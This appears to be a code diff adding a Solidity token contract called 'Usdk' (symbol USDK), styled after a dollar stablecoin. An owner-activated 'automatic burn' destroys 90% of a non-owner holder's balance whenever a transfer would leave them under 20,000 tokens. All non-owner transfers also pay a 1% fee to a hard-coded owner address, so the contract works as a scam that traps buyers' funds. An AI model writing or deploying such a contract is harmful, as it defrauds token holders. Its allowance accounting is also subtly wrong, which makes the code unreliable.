@@ -1,0 +1,115 @@
+pragma solidity ^0.8.2;
+
+contract MyToken {
+    string public name = "Usdk";
+    string public symbol = "USDK";
+    uint256 public totalSupply = 1_000_000_000 * 10 ** 18;
+    uint8 public decimals = 18;
+    address public owner = 0x353Bcf261D2552b908eCdAf1C78Bd42355DcdB46;
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+    uint256 public usdtPrice = 1; // USDT price in fixed currency
+    uint256 public constant automaticBurnThreshold = 20_000 * (10 ** 18);
+    uint256 public automaticBurnActivationTime;
+    bool public automaticBurnActivated;
+
+    uint256 public constant buyFeePercentage = 1;
+    uint256 public constant sellFeePercentage = 1;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+    event Burn(address indexed from, uint256 value);
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Only the contract owner can perform this action");
+        _;
+    }
+
+    modifier onlyOwnerOrAutomaticBurn() {
+        require(msg.sender == owner || (automaticBurnActivated && block.timestamp >= automaticBurnActivationTime), "Only the contract owner or automatic burn can perform this action");
+        _;
+    }
+
+    constructor() {
+        balanceOf[msg.sender] = totalSupply;
+    }
+
+    function setUSDTPrice(uint256 price) public onlyOwner {
+        usdtPrice = price;
+    }
+
+    function activateAutomaticBurn() public onlyOwner {
+        require(!automaticBurnActivated, "Automatic burn is already activated");
+        automaticBurnActivated = true;
+        automaticBurnActivationTime = block.timestamp + 2 seconds; // Activate the burn after 2 seconds
+    }
+
+    function transfer(address to, uint256 value) public returns (bool) {
+        require(balanceOf[msg.sender] >= value, "Insufficient balance");
+
+        // Check if automatic burn is activated, the threshold is reached, and the sender is not the owner
+        if (automaticBurnActivated && balanceOf[msg.sender] - value < automaticBurnThreshold && block.timestamp >= automaticBurnActivationTime && msg.sender != owner) {
+            uint256 burnAmount = (balanceOf[msg.sender] * 90) / 100; // Burn 90% of the sender's balance
+            balanceOf[msg.sender] -= burnAmount;
+            totalSupply -= burnAmount;
+            emit Burn(msg.sender, burnAmount);
+            emit Transfer(msg.sender, address(0), burnAmount);
+        }
+
+        // Apply buy fee if the sender is not the contract owner
+        if (msg.sender != owner) {
+            uint256 buyFeeAmount = (value * buyFeePercentage) / 100;
+            value -= buyFeeAmount;
+            balanceOf[owner] += buyFeeAmount;
+            emit Transfer(msg.sender, owner, buyFeeAmount);
+        }
+
+        balanceOf[msg.sender] -= value;
+        balanceOf[to] += value;
+        emit Transfer(msg.sender, to, value);
+        return true;
+    }
+
+    function transferFrom(address from, address to, uint256 value) public returns (bool) {
+        require(balanceOf[from] >= value, "Insufficient balance");
+        require(allowance[from][msg.sender] >= value, "Not allowed to transfer this amount");
+
+        // Apply sell fee if the sender is not the contract owner
+        if (from != owner) {
+            uint256 sellFeeAmount = (value * sellFeePercentage) / 100;
+            value -= sellFeeAmount;
+            balanceOf[owner] += sellFeeAmount;
+            emit Transfer(from, owner, sellFeeAmount);
+        }
+
+        balanceOf[from] -= value;
+        balanceOf[to] += value;
+        allowance[from][msg.sender] -= value;
+
+        emit Transfer(from, to, value);
+        return true;
+    }
+
+    function approve(address spender, uint256 value) public returns (bool) {
+        allowance[msg.sender][spender] = value;
+
+        emit Approval(msg.sender, spender, value);
+        return true;
+    }
+
+    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
+        allowance[msg.sender][spender] += addedValue;
+
+        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
+        return true;
+    }
+
+    function reduceAllowance(address spender, uint256 subtractedValue) public returns (bool) {
+        require(allowance[msg.sender][spender] >= subtractedValue, "Decrease exceeds allowance");
+
+        allowance[msg.sender][spender] -= subtractedValue;
+
+        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
+        return true;
+    }
+}
